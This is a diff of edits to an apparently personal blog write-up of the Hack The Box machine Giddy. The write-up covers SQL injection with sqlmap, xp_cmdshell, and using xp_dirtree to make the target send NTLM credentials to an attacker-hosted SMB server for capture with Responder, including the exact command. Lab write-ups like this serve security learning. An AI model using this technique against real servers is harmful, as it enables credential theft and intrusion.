@@ -2,6 +2,7 @@ Hey there again! Back with another Hackthebox machine write up, this time for th
 
 - xp_dirtree
 - Responder NTLM hash capture
+- Remote Powershell Console
 - Ubiquiti Windows Priv esc
 - Cross compiling Go reverse shells.
 
@@ -101,12 +102,12 @@ Next, let's check the `/mvc` directory that was found.
 
 Clicking around on this page, reveals this url: `https://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=27`
 
-This looks like an excellent place to attempt an SQLi. Capturing this request in Burp Suite, I saved the request and ran it through sqlmap.
+This looks like an excellent place to attempt an SQLi against the `ProductSubCategoryID` parameter. Capturing this request in Burp Suite, I saved the request and ran it through sqlmap.
 
 ![](/assets/images/Giddy/Giddy-SQLmap.png)
 
 
-After finding this SQLi injection, I then tried to dump all the tables, get some passwords, get a working SQL shell/OOB shell, the usual stuff. Nothing seemed to work.
+After finding this SQLi injection, I then tried to dump all the tables, get some passwords, get a working SQL shell/OOB shell, the usual stuff. Nothing seemed to work fully.
 
 I would get a `xp_cmdshell` session through SQLmap, but I couldn't get any true remote exectution to work. 
 Doing some digging into how exactly `xp_cmdtree` works and what is going on to actually allow SQL make system commands, I ran into a another SQL command similar to this called `xp_dirtree`.
@@ -117,7 +118,7 @@ These commands are called extended stored procedures, and lets look a bit closer
 XP extended Stored Procedures
 -----------------------------
 
-So first looking into `xp_cmdshell` which is used more widely in offensive security engagements, when it's presented to attackers. `xp_cmdshell` spawns a windows command shell and takes an arguement, and executes it on the host system. This is obviously very advantagous to any attacker that can leverage it on an improperly managed SQL server.
+So first looking into `xp_cmdshell` which is used more widely in offensive security engagements, when it's presented to attackers. `xp_cmdshell` spawns a windows command shell and takes an argument, and executes it on the host system. This is obviously very advantagous to any attacker that can leverage it on an improperly managed SQL server.
 
 Now, let's dig into `xp_dirtree`. This SQL procedure is used to list out all the contents of any directory on the host machine. It will display the contnets of any folder that you provide it as an argument. This can be somewhat dangerous for seeing any sensitive files that might be on the server. Bear in mind an attacker could not "read" any of these files, only see that the files exist.   
 
@@ -125,9 +126,9 @@ Now, let's dig into `xp_dirtree`. This SQL procedure is used to list out all the
 Abusing xp_dirtree
 ------------------
 
-Now let's use this procedure to our advantage. So we have a somewhat working shell using `xp_cmdshell` and we know that we can execute this other xp procedure to list out directories. We should remember too that SMB is active on this box as well, so this will be our way to gather credentials. On Windows, when you try to access a network share, you treat it as a directory you access. See where this is going...?
+Now let's use this procedure to our advantage. So we have a somewhat working shell using `xp_cmdshell` and we know that we can execute this other xp procedure to list out directories. We should remember too that SMB is active on this box as well, so this will be our way to gather credentials. On Windows, when you try to access a network share, you treat it as a directory just as on your local box. See where this is going...?
 
-So on a Windows machine, you press Ctl+r and type in `\\<HostToConnectTo\DirectoryToAccess` and if you have the proper permissions, you'll connect to that network share. And the way that permissions are checked, is that Windows sends NTLM authentication to the remote host to see if that user has access to that share or not.
+So on a Windows machine, you press Ctl+r and type in `\\<HostToConnectTo>\<DirectoryToAccess>` and if you have the proper permissions, you'll connect to that network share. And the way that permissions are checked, is that Windows sends NTLM authentication to the remote host to see if that user has access to that share or not.
 
 So what would happen if we host our own SMB server, use the `xp_dirtree` procedure to connect back to our malicious server, and we collect the credentials sent to us? Let's see below:
 
@@ -199,7 +200,7 @@ Now that we have that listening on our VPN, let's try and connect to it and see 
 
 
 ```sh
-EXEC Master.dbo.xp_dirtree"\\10.10.14.13\x",1,1;
+os-shell> EXEC Master.dbo.xp_dirtree"\\10.10.14.13\x",1,1;
 ```
 
 Now let's check our evil SMB server
